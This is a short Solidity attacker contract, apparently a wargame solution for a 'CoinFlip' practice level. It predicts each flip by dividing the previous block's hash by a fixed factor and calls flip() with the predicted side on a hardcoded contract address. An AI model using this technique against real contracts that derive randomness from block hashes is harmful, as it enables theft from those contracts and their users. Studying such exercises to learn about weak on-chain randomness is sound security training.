// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level3Solution {
    CoinFlip public coinFlip = CoinFlip(0x5b8e3b434d9804f29ad18E158DddAC9396b8574f);
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        lastHash = blockValue;
        uint256 calc = blockValue / FACTOR;
        bool side = calc == 1 ? true : false;
        coinFlip.flip(side);


    }

}